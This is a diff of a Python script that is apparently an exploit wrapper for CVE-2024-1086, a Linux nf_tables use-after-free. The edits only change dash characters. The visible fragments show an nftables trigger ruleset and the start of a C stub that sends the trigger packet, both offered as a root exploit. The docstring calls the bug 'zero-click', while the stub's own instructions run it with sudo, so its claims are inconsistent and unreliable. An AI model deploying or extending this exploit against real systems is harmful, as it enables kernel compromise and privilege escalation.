@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
-"""CVE-2024-1086 — nf_tables use-after-free. Double-free in nft_verdict_init
-via a crafted nftables ruleset; reaches root on Linux 5.14–6.6. Zero-click
+"""CVE-2024-1086 -- nf_tables use-after-free. Double-free in nft_verdict_init
+via a crafted nftables ruleset; reaches root on Linux 5.14--6.6. Zero-click
 for any box with a default nftables ruleset + packet trigger.
 Public exploit (Notselwyn). Confidence: HIGH."""
 import sys
 from pathlib import Path
 
 NFT_RULESET = r'''
-# minimal nftables trigger — double-free of nft_verdict via verdict map
+# minimal nftables trigger -- double-free of nft_verdict via verdict map
 table ip poc {
     chain input {
         type filter hook input priority 0; policy accept;
@@ -23,7 +23,7 @@ table ip poc {
 '''
 
 C_STUB = r'''
-/* nf_uaf.c — sets the ruleset and fires the trigger packet.
+/* nf_uaf.c -- sets the ruleset and fires the trigger packet.
  * cc nf_uaf.c -o nf_uaf && sudo ./nf_uaf
  * (ruleset applied via `nft -f ruleset.nft`; this just drives the packet) */
 #include <stdio.h>
